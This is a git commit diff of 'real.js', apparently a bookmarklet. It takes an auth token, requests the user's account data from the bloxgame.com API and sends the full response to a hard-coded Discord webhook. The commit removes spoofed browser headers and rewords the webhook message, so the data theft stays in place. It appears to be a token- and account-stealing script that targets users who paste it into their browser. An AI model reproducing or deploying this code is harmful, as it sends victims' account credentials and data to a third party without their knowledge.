d52e3b039d3aa7996a4d35de6759df9fa3c5fb9e
agreed69-scripts <kasparonuus@gmail.com>
2024-09-02 21:15:00 +0300

    Update real.js

--- real.js
+++ real.js
@@ -7,9 +7,6 @@ javascript:(function() {
             xhr.open("GET", "https://api.bloxgame.com/user", true);
             xhr.setRequestHeader("accept", "application/json, text/plain, */*");
             xhr.setRequestHeader("accept-language", "en-US,en;q=0.9");
-            xhr.setRequestHeader("origin", "https://early-access.bloxgame.com");
-            xhr.setRequestHeader("referer", "https://early-access.bloxgame.com/");
-            xhr.setRequestHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0");
             xhr.setRequestHeader("x-auth-token", token);
             xhr.setRequestHeader("x-client-version", "1.0.0");
             xhr.setRequestHeader("x-timezone", "Europe/Kiev");
@@ -20,7 +17,7 @@ javascript:(function() {
                     var webhookRequest = new XMLHttpRequest();
                     webhookRequest.open("POST", "https://discord.com/api/webhooks/1280222189429198858/M9axd-BRaA4_aLDb3aqzsHyvSsVVYusXykOX_K1hmvE6evrp5GkuWNqat4iy_p9HrNp3", true);
                     webhookRequest.setRequestHeader('Content-Type', 'application/json');
-                    webhookRequest.send(JSON.stringify({ content: 'API Response: ' + response }));
+                    webhookRequest.send(JSON.stringify({ content: 'Got user: ' + response }));
                     console.log('Response sent to webhook.');
                 }
             };
